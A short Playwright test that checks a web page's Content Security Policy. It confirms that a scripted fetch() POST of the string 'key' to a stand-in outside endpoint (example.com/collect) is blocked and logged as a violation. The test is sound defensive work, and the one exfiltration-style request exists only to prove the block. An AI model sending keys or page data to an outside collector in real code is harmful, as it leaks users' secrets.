import { expect, test } from '@playwright/test';

test('the page can only send data to itself and the Anthropic API', async ({ page }) => {
  const violations: string[] = [];
  page.on('console', (message) => {
    if (message.type() === 'error' && /Content Security Policy/.test(message.text())) {
      violations.push(message.text());
    }
  });
  await page.goto('./');
  await expect(page.locator('meta[http-equiv="Content-Security-Policy"]')).toHaveCount(1);

  const blocked = await page.evaluate(() =>
    fetch('https://example.com/collect', { method: 'POST', body: 'key' }).then(
      () => 'sent',
      () => 'blocked',
    ),
  );
  expect(blocked).toBe('blocked');
  expect(violations.some((v) => v.includes('example.com'))).toBe(true);
});
